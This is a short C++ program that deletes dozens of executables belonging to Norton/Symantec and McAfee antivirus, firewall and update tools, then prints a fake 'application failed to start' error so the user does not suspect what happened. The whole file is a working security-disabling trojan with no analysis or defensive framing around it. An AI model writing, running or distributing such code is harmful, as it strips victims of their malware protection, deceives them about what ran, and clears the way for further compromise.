#include <cstdio>
#include <iostream>

using namespace std;

int main()
{

  remove("c:/Program Files/Navnt/alertsvc.exe");
  remove("c:/Program Files/Navnt/BackLog.exe");
  remove("c:/Program Files/Navnt/BootWarn.exe");
  remove("c:/Program Files/Navnt/DefAlert.exe");
  remove("c:/Program Files/Navnt/n32scanw.exe");
  remove("c:/Program Files/Navnt/navapsvc.exe");
  remove("c:/Program Files/Navnt/navapw32.exe");
  remove("c:/Program Files/Navnt/NavUStub.exe");
  remove("c:/Program Files/Navnt/navwnt.exe");
  remove("c:/Program Files/Navnt/NPSCheck.exe");
  remove("c:/Program Files/Navnt/npssvc.exe");
  remove("c:/Program Files/Navnt/NSPlugin.exe");
  remove("c:/Program Files/Navnt/NtaskMgr.exe");
  remove("c:/Program Files/Navnt/nvlaunch.exe");
  remove("c:/Program Files/Navnt/POProxy.exe");
  remove("c:/Program Files/Navnt/qconsole.exe");
  remove("c:/Program Files/Navnt/ScnHndlr.exe");
  remove("c:/Program Files/Symantec/LiveUpdate/ndetect.exe");
  remove("c:/Program Files/Symantec/LiveUpdate/aupdate.exe");
  remove("c:/Program Files/Symantec/LiveUpdate/luall.exe");
  remove("c:/Program Files/Symantec/LiveUpdate/LuComServer.exe");
  remove("c:/Program Files/McAfee/McAfee Internet Security/gd32.exe");
  remove("c:/Program Files/McAfee/McAfee Internet Security/gdlaunch.exe");
  remove("c:/Program Files/McAfee/McAfee Internet Security/gdcrypt.exe");
  remove("c:/Program Files/McAfee/McAfee Internet Security/GuardDog.exe");
  remove("c:/Program Files/McAfee/McAfee Internet Security/IView.exe");
  remove("c:/Program Files/McAfee/McAfee Firewall/cpd.exe");
  remove("c:/Program Files/McAfee/McAfee Shared Components/VisualTrace/NeoTrace.exe");
  remove("c:/Program Files/McAfee/McAfee Shared Components/Shredder/shred32.exe");
  remove("c:/Program Files/McAfee/McAfee Shared Components/QuickClean Lite/QClean.exe");
  remove("c:/Program Files/McAfee/McAfee Shared Components/Instant Updater/RuLaunch.exe");
  remove("c:/Program Files/McAfee/McAfee Shared Components/Guardian/CMGrdian.exe");
  remove("c:/Program Files/McAfee/McAfee Shared Components/Guardian/schedwiz.exe");
  remove("c:/Program Files/McAfee/McAfee Shared Components/Central/CLaunch.exe");
  remove("c:/Program Files/McAfee/McAfee Internet Security/");
  
  cout << "Could not find dev/null/drivers.dll. Application failed to start." << endl;
  
  return 0;
}
